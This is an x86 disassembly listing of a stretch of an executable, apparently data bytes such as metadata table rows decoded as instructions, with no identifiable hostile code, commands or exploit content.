  40635f:	00 91 00 92 08 89    	add    %dl,-0x76f76e00(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 4e 19 0a    	add    %dl,0xa194e00(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 a8 02 94 00 10    	add    %ch,0x10009402(%eax)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 c9                	add    %cl,%cl
  40638d:	04 58                	add    $0x58,%al
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 87 19 9a    	add    %dl,-0x65e67900(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 fe 0c 9a    	add    %dl,-0x65f30200(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 05 15 0a    	add    %dl,0xa150518(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 0b                	add    %cl,(%ebx)
  4063c5:	0f 0a                	(bad)
  4063c7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	ff 14 0e             	call   *(%esi,%ecx,1)
  4063d5:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 3d 17 0a    	add    %dl,0xa173d00(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 5a 0e 1d    	add    %dl,0x1d0e5a00(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 6b 02 1d    	add    %dl,0x1d026b00(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 49 14 1d    	add    %dl,0x1d144900(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 e5                	add    %ah,%ch
  406419:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 8a 05 1d 00 14    	add    %cl,0x14001d05(%edx)
  40642b:	00 78 20             	add    %bh,0x20(%eax)
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 18                	xchg   %bl,(%eax)
  406434:	ff 14 0e             	call   *(%esi,%ecx,1)
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 f4                	add    %dh,%ah
  406443:	01 c3                	add    %eax,%ebx
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 2d 0d c7 00 14    	add    %ch,0x1400c70d
  406455:	00 5c 37 00          	add    %bl,0x0(%edi,%esi,1)
  406459:	00 00                	add    %al,(%eax)
  40645b:	00 96 00 12 12 53    	add    %dl,0x53121200(%esi)
  406461:	00 15 00 7b 21 00    	add    %dl,0x217b00
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 d5 10 1d    	add    %dl,0x1d10d500(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 e5 19 0a    	add    %dl,0xa19e500(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 b1 18 c3    	add    %dl,-0x3ce74f00(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 81 13 d5    	add    %dl,-0x2aec7f00(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 77 12 0a    	add    %dl,0xa127700(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 92 06 c3    	add    %dl,-0x3cf96e00(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 36 1c 1d    	add    %dl,0x1d1c3600(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 2b 1c 0a    	add    %dl,0xa1c2b00(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 fe    	add    %al,-0x1df6a00(%eax)
  4064dd:	1b e0                	sbb    %eax,%esp
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 e9    	add    %al,-0x16df6a00(%eax)
  4064eb:	1b e4                	sbb    %esp,%esp
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 eb    	add    %al,-0x14df6a00(%eax)
  4064f9:	05 ec 00 19 00       	add    $0x1900ec,%eax
  4064fe:	00 00                	add    %al,(%eax)
  406500:	00 00                	add    %al,(%eax)
  406502:	80 00 96             	addb   $0x96,(%eax)
  406505:	20 ff                	and    %bh,%bh
  406507:	1a f1                	sbb    %cl,%dh
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 bf    	add    %al,-0x40df6a00(%eax)
  406515:	08 f8                	or     %bh,%al
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 7c 0e ff          	and    %bh,-0x1(%esi,%ecx,1)
  406525:	00 1d 00 ad 21 00    	add    %bl,0x21ad00
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 c5 0b 1c    	add    %dl,0x1c0bc500(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 67 19 0a    	add    %dl,0xa196700(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 ed                	add    %ch,%ch
  40654d:	19 0a                	sbb    %ecx,(%edx)
  40654f:	00 22                	add    %ah,(%edx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 bd 0a 23    	add    %dl,0x230abd00(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 b4 0a 2a 01 24 00 	add    %dh,0x24012a(%edx,%ecx,1)
  40656e:	cc                   	int3
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 9d 0a 84    	add    %dl,-0x7bf56300(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 ac 1c 1d    	add    %dl,0x1d1cac00(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 05 15 0a    	add    %dl,0xa150518(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 11 03 9a    	add    %dl,-0x65fcef00(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 9a 05 38 01 27    	add    %bl,0x27013805(%edx)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 67 03 0a    	add    %dl,0xa036700(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 9b 14 3e    	add    %dl,0x3e149b00(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 05 15 0a 00 29    	sbb    %al,0x29000a15
  4065dd:	00 f4                	add    %dh,%ah
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	ff 14 6b             	call   *(%ebx,%ebp,2)
  4065e9:	01 29                	add    %ebp,(%ecx)
  4065eb:	00 56 22             	add    %dl,0x22(%esi)
  4065ee:	00 00                	add    %al,(%eax)
  4065f0:	00 00                	add    %al,(%eax)
  4065f2:	86 00                	xchg   %al,(%eax)
  4065f4:	76 1b                	jbe    0x406611
  4065f6:	70 01                	jo     0x4065f9
  4065f8:	2a 00                	sub    (%eax),%al
  4065fa:	6c                   	insb   (%dx),%es:(%edi)
  4065fb:	41                   	inc    %ecx
  4065fc:	00 00                	add    %al,(%eax)
  4065fe:	00 00                	add    %al,(%eax)
  406600:	86 00                	xchg   %al,(%eax)
  406602:	76 1b                	jbe    0x40661f
  406604:	75 01                	jne    0x406607
  406606:	2b 00                	sub    (%eax),%eax
  406608:	6e                   	outsb  %ds:(%esi),(%dx)
  406609:	22 00                	and    (%eax),%al
  40660b:	00 00                	add    %al,(%eax)
  40660d:	00 86 00 6e 1b 70    	add    %al,0x701b6e00(%esi)
  406613:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 6e 1b 75    	add    %al,0x751b6e00(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 e1 0e 7c 01    	addl   $0x17c0ee1,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 05 15 0a    	add    %dl,0xa150518(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 17                	add    %dl,(%edi)
  406649:	0d c7 00 30 00       	or     $0x3000c7,%eax
  40664e:	40                   	inc    %eax
  40664f:	45                   	inc    %ebp
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 17                	add    %dl,(%edi)
  406657:	0d 84 01 31 00       	or     $0x310184,%eax
  40665c:	9f                   	lahf
  40665d:	22 00                	and    (%eax),%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 96 00 3c 16 2a    	add    %dl,0x2a163c00(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 ad 0c 93 01 33    	add    %ch,0x3301930c(%ebp)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 87 0c 93    	add    %dl,-0x6cf37900(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 b7 0c 93 01 35    	add    %dh,0x3501930c(%edi)
  406693:	00 10                	add    %dl,(%eax)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 83 16 84 01 36    	add    %al,0x36018416(%ebx)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 d6 00 99    	add    %dl,-0x66ff2a00(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 f1 00 a5    	add    %dl,-0x5aff0f00(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 c2 05 ab    	add    %dl,-0x54fa3e00(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	ff 14 0e             	call   *(%esi,%ecx,1)
  4066e5:	00 3b                	add    %bh,(%ebx)
  4066e7:	00 0b                	add    %cl,(%ebx)
  4066e9:	23 00                	and    (%eax),%eax
  4066eb:	00 00                	add    %al,(%eax)
  4066ed:	00 91 18 05 15 0a    	add    %dl,0xa150518(%ecx)
  4066f3:	00 3b                	add    %bh,(%ebx)
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 ff 14 b1    	add    %al,-0x4eeb00e8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 c9                	or     %ecx,%ecx
  40670d:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 b5 1b bf 01 3c    	add    %esi,0x3c01bf1b(%ebp)
  40671f:	00 63 23             	add    %ah,0x23(%ebx)
  406722:	00 00                	add    %al,(%eax)
  406724:	00 00                	add    %al,(%eax)
  406726:	e1 01                	loope  0x406729
  406728:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406729:	19 0e                	sbb    %ecx,(%esi)
  40672b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 ff 14 cb    	add    %al,-0x34eb00e8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 27 03 d7    	add    %al,-0x28fcd900(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 27 03 dc    	add    %al,-0x23fcd900(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 27 03 e2    	add    %al,-0x1dfcd900(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 27 03 e8    	add    %al,-0x17fcd900(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 cf 0f ee    	add    %al,-0x11f030f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	7b 0d                	jnp    0x406799
  40678c:	f4                   	hlt
  40678d:	01 42 00             	add    %eax,0x0(%edx)
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 91 07 6b 01    	addl   $0x16b0791,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 c4 12 0e 00    	addl   $0xe12c4,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 22 03 d7 01    	addl   $0x1d70322,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 67 0b 0a 02    	addl   $0x20a0b67,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	0e                   	push   %cs
  4067d1:	19 dc                	sbb    %ebx,%esp
  4067d3:	01 44 00 00          	add    %eax,0x0(%eax,%eax,1)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 a0 04 d7    	add    %al,-0x28fb6000(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 b1 04 d7    	add    %al,-0x28fb4f00(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 b6 04 d7    	add    %al,-0x28fb4a00(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 6e 12 0f 02    	addl   $0x20f126e,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 48 1c 0f 02    	addl   $0x20f1c48,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	d8 13                	fcoms  (%ebx)
  406826:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 c2 00 1a    	add    %al,0x1a00c200(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 b6 00 1f    	add    %al,0x1f00b600(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	cb                   	lret
  40684f:	13 23                	adc    (%ebx),%esp
  406851:	02 49 00             	add    0x0(%ecx),%cl
  406854:	28 4a 00             	sub    %cl,0x0(%edx)
  406857:	00 00                	add    %al,(%eax)
  406859:	00 86 00 f8 18 27    	add    %al,0x2718f800(%esi)
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	a8 16                	test   $0x16,%al
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	9d                   	popf
  406879:	16                   	push   %ss
  40687a:	31 02                	xor    %eax,(%edx)
  40687c:	4a                   	dec    %edx
  40687d:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  406883:	00 86 00 27 03 36    	add    %al,0x36032700(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 27                	add    %ah,(%edi)
  406895:	03 3c 02             	add    (%edx,%eax,1),%edi
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 8d 16 42    	add    %al,0x42168d00(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 66 06 42    	add    %al,0x42066600(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	2e 19 dc             	cs sbb %ebx,%esp
  4068c1:	01 50 00             	add    %edx,0x0(%eax)
  4068c4:	b0 24                	mov    $0x24,%al
  4068c6:	00 00                	add    %al,(%eax)
  4068c8:	00 00                	add    %al,(%eax)
  4068ca:	86 00                	xchg   %al,(%eax)
  4068cc:	49                   	dec    %ecx
  4068cd:	0f 0e                	femms
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 a1 0c 6b    	add    %al,0x6b0ca100(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 95 0c 47    	add    %al,0x470c9500(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 79 10 4b    	add    %al,0x4b107900(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	3f                   	aas
  406905:	06                   	push   %es
  406906:	50                   	push   %eax
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	03 19                	add    (%ecx),%ebx
  406914:	55                   	push   %ebp
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	73 16                	jae    0x406938
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	57                   	push   %edi
  40692f:	06                   	push   %es
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	91                   	xchg   %eax,%ecx
  40693d:	0f                   	(bad)
  40693e:	0f 02 57 00          	lar    0x0(%edi),%edx
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	2f                   	das
  40694b:	16                   	push   %ss
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	60                   	pusha
  406959:	0f                   	(bad)
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	6d                   	insl   (%dx),%es:(%edi)
  406967:	0c 47                	or     $0x47,%al
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	7a 0c                	jp     0x406982
  406976:	6b 01 59             	imul   $0x59,(%ecx),%eax
  406979:	00 45 25             	add    %al,0x25(%ebp)
  40697c:	00 00                	add    %al,(%eax)
  40697e:	00 00                	add    %al,(%eax)
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	af                   	scas   %es:(%edi),%eax
  406983:	13 23                	adc    (%ebx),%esp
  406985:	02 5a 00             	add    0x0(%edx),%bl
  406988:	4d                   	dec    %ebp
  406989:	25 00 00 00 00       	and    $0x0,%eax
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	bd 13 15 02 5a       	mov    $0x5a021513,%ebp
  406995:	00 56 25             	add    %dl,0x25(%esi)
  406998:	00 00                	add    %al,(%eax)
  40699a:	00 00                	add    %al,(%eax)
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	e0 18                	loopne 0x4069b8
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	ec                   	in     (%dx),%al
  4069ad:	18 55 02             	sbb    %dl,0x2(%ebp)
  4069b0:	5b                   	pop    %ebx
  4069b1:	00 c0                	add    %al,%al
  4069b3:	54                   	push   %esp
  4069b4:	00 00                	add    %al,(%eax)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	86 08                	xchg   %cl,(%eax)
  4069ba:	78 1c                	js     0x4069d8
  4069bc:	5a                   	pop    %edx
